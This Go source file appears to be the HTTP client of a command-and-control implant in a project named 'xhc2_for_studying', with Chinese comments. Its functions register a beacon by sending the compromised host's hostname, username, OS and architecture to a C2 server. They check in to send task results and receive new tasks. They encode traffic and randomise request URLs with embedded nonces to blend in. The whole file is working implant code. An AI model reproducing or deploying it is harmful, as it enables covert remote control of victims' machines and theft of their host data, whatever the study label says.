package client

import (
	"bytes"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"net/http"

	"xhc2_for_studying/implant/config"
	"xhc2_for_studying/implant/identity"
	"xhc2_for_studying/protocol"
	beaconProtocol "xhc2_for_studying/protocol/beacon"
)

// contentType 根据编码器 ID 返回对应的 Content-Type。
func contentType(encoderID int) string {
	switch encoderID {
	case 0: // Plain
		return "application/json"
	default: // Base64 或其他
		return "application/octet-stream"
	}
}

// sendEncoded 执行一次编码后的 HTTP POST。
// 1. 编码请求体
// 2. 生成随机 URL + 嵌入 nonce
// 3. 发送请求
// 4. 解码响应体
//
// 返回解码后的响应字节和可能出现的错误。
func (c *Client) sendEncoded(jsonBody []byte, rctx *RequestContext) ([]byte, error) {
	// 编码请求体
	encodedBody, err := encodeBody(jsonBody, rctx.EncoderID)
	if err != nil {
		return nil, fmt.Errorf("encode request: %w", err)
	}

	// 生成随机 URL 并嵌入 nonce
	reqURL, err := buildRandomURL(c.baseURL, c.c2Profile)
	if err != nil {
		return nil, fmt.Errorf("build random url: %w", err)
	}
	embedNonce(reqURL, rctx.Nonce, c.c2Profile.NonceMode)

	// 发送请求
	httpReq, err := http.NewRequest(http.MethodPost, reqURL.String(), bytes.NewReader(encodedBody))
	if err != nil {
		return nil, err
	}
	httpReq.Header.Set("Content-Type", contentType(rctx.EncoderID))

	resp, err := c.httpClient.Do(httpReq)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	rawBody, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}

	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("request failed with status %d: %s", resp.StatusCode, string(rawBody))
	}

	// 解码响应体
	return decodeBody(rawBody, rctx.EncoderID)
}

func (c *Client) Register(hostInfo *identity.HostInfo, cfg *config.BeaconConfig) (string, error) {
	if c == nil {
		return "", errors.New("client is nil")
	}
	if hostInfo == nil {
		return "", errors.New("host info is nil")
	}
	if cfg == nil {
		return "", errors.New("beacon config is nil")
	}

	req := &beaconProtocol.RegisterRequest{
		Hostname: hostInfo.Hostname,
		Username: hostInfo.Username,
		OS:       hostInfo.OS,
		Arch:     hostInfo.Arch,
		Interval: cfg.Interval,
		Jitter:   cfg.Jitter,
	}

	jsonReq, err := json.Marshal(req)
	if err != nil {
		return "", err
	}

	rctx := NewRequestContext(c.c2Profile.EncoderModulus)
	decodedBody, err := c.sendEncoded(jsonReq, rctx)
	if err != nil {
		return "", err
	}

	var registerResp beaconProtocol.RegisterResponse
	if err := json.Unmarshal(decodedBody, &registerResp); err != nil {
		return "", err
	}
	if registerResp.BeaconID == "" {
		return "", errors.New("empty beacon id in register response")
	}

	return registerResp.BeaconID, nil
}

func (c *Client) CheckIn(beaconID string, taskResult *protocol.TaskResult) (*beaconProtocol.CheckinResponse, error) {
	if c == nil {
		return nil, errors.New("client is nil")
	}
	if beaconID == "" {
		return nil, errors.New("beacon id is empty")
	}

	reqTaskResult := protocol.TaskResult{}
	if taskResult != nil {
		reqTaskResult = *taskResult
	}

	req := &beaconProtocol.CheckinRequest{
		BeaconID:   beaconID,
		TaskResult: reqTaskResult,
	}
	jsonReq, err := json.Marshal(req)
	if err != nil {
		return nil, err
	}

	rctx := NewRequestContext(c.c2Profile.EncoderModulus)
	decodedBody, err := c.sendEncoded(jsonReq, rctx)
	if err != nil {
		return nil, err
	}

	var checkinResp beaconProtocol.CheckinResponse
	if err := json.Unmarshal(decodedBody, &checkinResp); err != nil {
		return nil, err
	}
	return &checkinResp, nil
}
